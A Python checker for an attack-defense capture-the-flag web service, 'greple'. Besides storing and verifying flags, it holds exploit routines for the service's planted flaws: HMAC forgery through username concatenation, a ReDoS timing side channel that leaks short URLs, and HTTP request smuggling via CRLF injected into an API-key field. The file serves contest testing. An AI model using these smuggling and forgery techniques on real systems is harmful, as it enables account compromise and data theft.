"""Checker for greple service."""

import asyncio
import hashlib
import logging
import random
import re
from collections.abc import Awaitable, Iterable
from html import unescape
from urllib.parse import parse_qs, quote, unquote, urlencode

import fastapi
import h11
import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

from client import Client
from exploit import calibrate_redos, exploit_sca_letter
from noise import letter_noise, username_noise, word_noise
from utils import (
    PASTE_URL_REGEX,
    SHORT_URL_LENGTH,
    SHORT_URL_PREFIX,
    SHORT_URL_REGEX,
    assert_not_in,
    assert_status,
    find_token,
    get_search_console,
    get_short_url,
    logger,
    paste,
    re_escape,
    register_user,
    search,
    set_safe_search,
    shorten_url,
    submit_page,
    token,
    verify_netloc,
)

_CHECKER = Enochecker("greple", 7777)
_cal = None


@_CHECKER.register_dependency
def _client(client: httpx.AsyncClient, logger: logging.LoggerAdapter) -> Client:
    return Client.wrap(client, logger)


@_CHECKER.putflag(0)
async def _putflag_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
    assert client.base_url.port is not None
    base_url = client.base_url.copy_with(port=client.base_url.port - random.randint(1, 7))

    username = username_noise(128)
    await register_user(client, username)

    await submit_page(client, False, str(base_url.join(f"/{quote(task.flag, safe='')}")))

    await db.set("cookie", client.cookies["user_account"])

    return base_url.netloc.decode()


@_CHECKER.getflag(0)
async def _getflag_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
    try:
        cookie = await db.get("cookie")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = cookie

    res = await get_search_console(client)
    assert_in(task.flag, unquote(unescape(res.text)), "Submitted URL not in table")


@_CHECKER.putflag(1)
async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
    assert client.base_url.port is not None
    base_url = client.base_url.copy_with(port=client.base_url.port - random.randint(1, 7))

    username = username_noise(128)
    await register_user(client, username)

    short_url = await shorten_url(client, str(base_url.join(f"/{quote(task.flag, safe='')}")))

    paste_url = await paste(client, word_noise(16), short_url)
    await submit_page(client, False, str(paste_url))

    await db.set("username", username)
    await db.set("cookie", client.cookies["user_account"])

    return f"user:{username}"


@_CHECKER.getflag(1)
async def _getflag_short_url(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
    try:
        username = await db.get("username")
        cookie = await db.get("cookie")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = cookie

    res = await client.get("/console")
    assert_status(res, 200)
    paste_url = re.search(PASTE_URL_REGEX, unescape(res.text))
    if not paste_url:
        raise MumbleException("Failed to find paste URL")

    res = await client.get(paste_url[0])
    assert_status(res, 200)
    short_url_paste = re.search(SHORT_URL_REGEX, unescape(res.text))
    if not short_url_paste:
        raise MumbleException("Failed to find short URL")

    body = await search(client, f"user:{username}")
    short_url_search = re.search(SHORT_URL_REGEX, unescape(body))
    if not short_url_search:
        raise MumbleException("Failed to find short URL")

    assert_equals(short_url_paste[0], short_url_search[0], "Found mismatching short URLs")

    url = await get_short_url(client, short_url_search[0])
    assert_in(task.flag, unquote(url), "Flag missing from URL")


@_CHECKER.putflag(2)
async def _putflag_api_key(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
    username = username_noise(128)
    await register_user(client, username)

    assert client.base_url.port is not None
    base_url = client.base_url.copy_with(port=client.base_url.port + 1)

    await verify_netloc(client, base_url.netloc.decode(), task.flag)

    refresh_hash = await submit_page(client, False, str(base_url.join(f"/{letter_noise(128)}")))

    await db.set("cookie", client.cookies["user_account"])

    return refresh_hash


@_CHECKER.getflag(2)
async def _getflag_api_key(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
    try:
        cookie = await db.get("cookie")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = cookie

    res = await get_search_console(client)
    assert_in(task.flag, unquote(unescape(res.text)), "API key not in table")


@_CHECKER.putnoise(0)
async def _put_public_document(client: Client, db: ChainDB) -> None:
    username = username_noise(128)
    await register_user(client, username)

    title = word_noise(128)
    text = word_noise(128)
    paste_url = await paste(client, title, text)
    await submit_page(client, True, str(paste_url))

    await db.set("username", username)
    await db.set("title", title)
    await db.set("text", text)


@_CHECKER.getnoise(0)
async def _get_public_document(client: Client, db: ChainDB) -> None:
    try:
        username = await db.get("username")
        title = await db.get("title")
        text = await db.get("text")
    except KeyError as e:
        raise MumbleException("Missing putnoise data in DB") from e

    body = await search(client, text)
    assert_in(title, unescape(body), "Public document not returned as result")

    body = await search(client, f"user:{username}")
    assert_in(title, unescape(body), "Public document not returned as result")
    assert_in(text, unescape(body), "Public document not returned as result")
    assert_in("of <b>1</b>.", unescape(body), "Unexpected result count")

    query = urlencode({"q": text, "lucky": "I'm Feeling Lucky"})
    res = await client.get(f"/search?{query}")
    assert_status(res, 302)
    if not res.next_request:
        raise MumbleException("No redirect location")

    word = random.choice(text.split(" "))
    await set_safe_search(client, True, re_escape(word))

    body = await search(client, text)
    assert_not_in(title, unescape(body), "Public document not filtered by safe search")

    body = await search(client, f"user:{username}")
    assert_not_in(title, unescape(body), "Public document not filtered by safe search")
    assert_not_in(text, unescape(body), "Public document not filtered by safe search")


@_CHECKER.havoc(0)
async def _cron(client: Client) -> None:
    await client.get("/cron")


@_CHECKER.havoc(1)
async def _verify_netloc(client: Client) -> None:
    assert client.base_url.port is not None
    base_url = client.base_url.copy_with(port=client.base_url.port + 1)

    user_a = username_noise(128)
    await register_user(client, user_a)
    path_a = f"/{letter_noise(128)}"
    await submit_page(client, False, str(base_url.join(path_a)))

    user_b = username_noise(128)
    await register_user(client, user_b)

    netloc = base_url.netloc.decode()
    api_key = letter_noise(128)
    netloc_hash = await verify_netloc(client, netloc, api_key)

    t = await find_token(client, user_b)

    body = await token(client, netloc_hash, t)
    assert_in(path_a, unescape(body), "Failed to find entries for verified netloc")
    assert_in(user_a, unescape(body), "Failed to find entries for verified netloc")

    path_b = f"/{letter_noise(128)}"
    await submit_page(client, False, str(base_url.join(path_b)))

    logs = await logger(client, path_b)
    api_key_hash = hashlib.sha224(api_key.encode()).hexdigest()
    assert_in(api_key_hash, unescape(logs), "API-Key not found in logged request")


@_CHECKER.exploit(0)
async def _exploit_hmac(client: Client, task: ExploitCheckerTaskMessage) -> str:
    assert task.attack_info is not None
    assert task.attack_info.startswith(client.base_url.netloc.decode().split(":")[0])

    username = username_noise(128)

    await register_user(client, f"{username}{task.attack_info}")
    hmac = parse_qs(client.cookies["user_account"])["hmac"][0]

    await register_user(client, username)

    netloc_hash = await verify_netloc(client, task.attack_info, "")

    body = await token(client, netloc_hash, hmac)

    return "\n".join(m[0] for m in re.finditer(task.flag_regex, unquote(unescape(body))))


async def _parallel[T](aws: Iterable[Awaitable[T]]) -> list[T]:
    sem = asyncio.Semaphore(2)

    async def wrap(aw: Awaitable[T]) -> T:
        async with sem:
            return await aw

    return await asyncio.gather(*(wrap(aw) for aw in aws))


@_CHECKER.exploit(1)
async def _exploit_sca(
    logger: logging.LoggerAdapter,
    client: Client,
    task: ExploitCheckerTaskMessage,
) -> str:
    assert task.attack_info is not None
    assert task.attack_info.startswith("user:")

    global _cal
    if _cal is None:
        _cal = await calibrate_redos(logger, client)

    short_url = "".join(
        await _parallel(
            exploit_sca_letter(logger, client, _cal, task.attack_info, i) for i in range(SHORT_URL_LENGTH)
        ),
    )

    url = await get_short_url(client, SHORT_URL_PREFIX + short_url)
    return unquote(url)


def _refresh(client: Client, refresh_hash: str) -> bytes:
    conn = h11.Connection(h11.CLIENT)
    content = b"hash=" + refresh_hash.encode()
    packet = conn.send(
        h11.Request(
            method="POST",
            target="/refresh",
            headers=[
                ("host", client.base_url.netloc.decode()),
                ("cookie", "user_account=" + client.cookies["user_account"]),
                ("content-length", str(len(content))),
                ("content-type", "application/x-www-form-urlencoded"),
            ],
        ),
    )
    packet += conn.send(h11.Data(content))
    packet += conn.send(h11.EndOfMessage())
    return packet


@_CHECKER.exploit(2)
async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> str:
    assert task.attack_info is not None

    assert client.base_url.port is not None
    base_url = client.base_url.copy_with(port=client.base_url.port + 1)

    username = username_noise(128)
    await register_user(client, username)

    refresh_hash = await submit_page(client, False, str(base_url.join("/exploit")))
    assert len(refresh_hash) == len(task.attack_info)

    netloc = base_url.netloc.decode()
    cl = (
        101  # extra headers
        + 173  # next request w/o flag & path
        + 24  # path
        + {
            "ENO[A-Za-z0-9+\\/=]{48}": 48 + 3,
            "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
        }[task.flag_regex]
    )
    dump = f"/{letter_noise(128)}"
    await verify_netloc(
        client,
        netloc,
        f"\r\n\r\nPOST {dump} HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n",
    )

    packet = _refresh(client, refresh_hash) + _refresh(client, task.attack_info)
    _, w = await asyncio.open_connection(client.base_url.host, client.base_url.port)
    w.write(packet)
    await w.drain()
    w.close()
    await w.wait_closed()

    while True:
        logs = await logger(client, dump)
        lines = "".join(re.findall("(?:[0-9a-f]{2} )+ ", unescape(logs)))
        if lines:
            content = bytes.fromhex(lines.replace(" ", "")).decode()
            return "\n".join(re.findall(task.flag_regex, content))
        await asyncio.sleep(0.1)


def app() -> fastapi.FastAPI:
    """Return app to gunicorn."""
    return _CHECKER.app
